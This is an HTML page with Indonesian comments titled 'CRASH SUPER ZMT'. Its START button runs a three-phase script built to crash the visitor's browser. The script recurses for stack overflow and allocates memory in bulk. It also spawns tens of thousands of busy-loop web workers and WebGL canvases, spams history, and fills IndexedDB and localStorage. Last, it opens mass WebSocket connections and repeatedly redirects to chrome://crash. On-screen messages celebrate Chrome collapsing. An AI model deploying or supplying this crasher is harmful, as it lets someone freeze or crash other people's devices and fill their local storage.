<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CRASH SUPER ZMT</title>
    <style>
        body {
            margin: 0;
            background: black;
            color: white;
            font-family: 'Courier New', monospace;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
            flex-direction: column;
        }
        #btn {
            font-size: 4rem;
            padding: 30px 100px;
            background: red;
            border: 5px solid white;
            border-radius: 80px;
            color: white;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 0 100px red;
            animation: pulse 0.5s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        #status {
            margin-top: 50px;
            font-size: 2rem;
            color: lime;
            display: none;
            text-align: center;
            white-space: pre-line;
        }
    </style>
</head>
<body>
    <div id="btn">START</div>
    <div id="status"></div>

    <script>
        document.getElementById('btn').onclick = function() {
            const btn = this;
            const statusDiv = document.getElementById('status');
            
            btn.style.display = 'none';
            statusDiv.style.display = 'block';
            
            // ========== PLAY CRASH.MP3 ==========
            try {
                let crashSound = new Audio('crash.mp3');
                crashSound.volume = 1.0;
                crashSound.play();
            } catch (e) {}

            // Mulai waktu
            const startTime = Date.now();
            
            // ========== SUARA 20.000 (lebih banyak) ==========
            for (let ctx = 0; ctx < 1000; ctx++) {
                try {
                    let a = new (window.AudioContext || window.webkitAudioContext)();
                    let g = a.createGain();
                    g.gain.value = 0.001;
                    g.connect(a.destination);
                    for (let i = 0; i < 20; i++) {
                        let o = a.createOscillator();
                        o.type = ['sine', 'square', 'sawtooth', 'triangle'][Math.floor(Math.random() * 4)];
                        o.frequency.value = 1 + Math.random() * 10000;
                        let og = a.createGain();
                        og.gain.value = 0.00005;
                        o.connect(og);
                        og.connect(g);
                        o.start();
                    }
                    if (a.state === 'suspended') a.resume();
                } catch (e) {}
            }

            // ========== UPDATE STATUS ==========
            function updateStatus() {
                const elapsed = Math.floor((Date.now() - startTime) / 1000);
                let phase = '';
                if (elapsed < 5) phase = '⚡ FASE 1: MEMORY LEAK (0-5 detik) ⚡';
                else if (elapsed < 10) phase = '💀 FASE 2: WORKER & WEBGL (5-10 detik) 💀';
                else phase = '🔥 FASE 3: INFINITE LOOP (10+ detik) 🔥';
                
                statusDiv.innerText = `${phase}\n\nWaktu: ${elapsed} detik\n\nChrome mau tumbang...`;
                
                if (elapsed < 15) {
                    requestAnimationFrame(updateStatus);
                } else {
                    statusDiv.innerText = '💥 CHROME SUDAH TUMBANG 💥';
                }
            }
            requestAnimationFrame(updateStatus);

            // ========== FASE 1: MEMORY LEAK + STACK OVERFLOW (0-5 detik) ==========
            (function fase1() {
                let memLeak = [];
                function stackLoop(depth) {
                    if (depth > 1000000) return; // lebih dalam
                    stackLoop(depth + 1);
                }
                // stack overflow tiap 10ms
                let stackInterval = setInterval(() => {
                    for (let s = 0; s < 10; s++) { // multiple stack
                        try { stackLoop(0); } catch(e){}
                    }
                }, 10);
                
                // Alokasi memory tiap 1ms (lebih rapat)
                let memInterval = setInterval(() => {
                    for (let i = 0; i < 10000; i++) { // 10x lipat
                        try {
                            memLeak.push(new ArrayBuffer(100000000)); // 100MB
                            memLeak.push(new Blob([new Uint8Array(200000000)])); // 200MB
                            memLeak.push(new Array(5000000).join('x')); // 5MB
                        } catch(e){}
                    }
                }, 1);
                
                setTimeout(() => {
                    clearInterval(stackInterval);
                    clearInterval(memInterval);
                }, 5000);
            })();

            // ========== FASE 2: WEB WORKER + WEBGL + HISTORY (5-10 detik) ==========
            setTimeout(() => {
                // 50.000 Worker
                for (let w = 0; w < 50000; w++) {
                    setTimeout(() => {
                        try {
                            new Worker(URL.createObjectURL(new Blob([`
                                while(1) {
                                    for(let i=0;i<9999999;i++) { Math.sqrt(i); }
                                }
                            `])));
                        } catch(e){}
                    }, w * 0.5); // lebih rapat
                }
                
                // 50.000 Canvas WebGL
                for (let g = 0; g < 50000; g++) {
                    setTimeout(() => {
                        try {
                            let c = document.createElement('canvas');
                            c.width = 4096;
                            c.height = 4096;
                            let gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                            if (gl) {
                                for (let t = 0; t < 500; t++) {
                                    gl.createTexture();
                                    gl.createBuffer();
                                }
                            }
                            document.body.appendChild(c);
                        } catch(e){}
                    }, g * 1);
                }
                
                // History spam 10.000 per ms
                let histInterval = setInterval(() => {
                    for (let h = 0; h < 10000; h++) {
                        try { history.pushState({}, '', '/#' + Math.random()); } catch(e){}
                    }
                }, 1);
                
                setTimeout(() => clearInterval(histInterval), 5000);
            }, 5000);

            // ========== FASE 3: INFINITE LOOP + RELOAD + SEGALANYA (10-15 detik) ==========
            setTimeout(() => {
                // SharedArrayBuffer 500.000
                if (typeof SharedArrayBuffer !== 'undefined') {
                    for (let s = 0; s < 500000; s++) {
                        try { new SharedArrayBuffer(100000000); } catch(e){}
                    }
                }
                
                // IndexedDB bomb (1000 store, 100000 entry)
                try {
                    let req = indexedDB.open('killerdb', 1);
                    req.onsuccess = function(e) {
                        let db = e.target.result;
                        for (let t = 0; t < 1000; t++) {
                            if (!db.objectStoreNames.contains('s' + t)) {
                                let store = db.createObjectStore('s' + t, { keyPath: 'id' });
                                for (let d = 0; d < 100000; d++) {
                                    try { store.put({ id: d, data: 'x'.repeat(1000000) }); } catch(e){}
                                }
                            }
                        }
                    };
                } catch(e){}
                
                // Timer 10 juta
                for (let t = 0; t < 10000000; t++) {
                    setInterval(() => {
                        for(let z=0;z<100000;z++){ Math.random(); }
                    }, 0);
                }
                
                // LocalStorage 1 juta
                for (let s = 0; s < 1000000; s++) {
                    try { localStorage.setItem('k' + s, 'x'.repeat(1000000)); } catch(e){}
                }
                
                // WebSocket 50.000
                for (let ws = 0; ws < 50000; ws++) {
                    try { new WebSocket('ws://localhost:' + ws); } catch(e){}
                }
                
                // Infinite loop main thread
                let arr = [];
                let loopInterval = setInterval(() => {
                    for (let i = 0; i < 1000000; i++) {
                        try {
                            arr.push(new ArrayBuffer(500000000));
                            arr.push(new Array(10000000).join('x'));
                        } catch(e){}
                    }
                }, 0);
                
                // Reload paksa tiap 10ms
                let reloadInterval = setInterval(() => {
                    try { location.replace('chrome://crash'); } catch(e){}
                    try { location.replace('about:crash'); } catch(e){}
                }, 10);
                
                setTimeout(() => {
                    clearInterval(loopInterval);
                    clearInterval(reloadInterval);
                }, 5000);
            }, 10000);
        };
    </script>
</body>
</html>
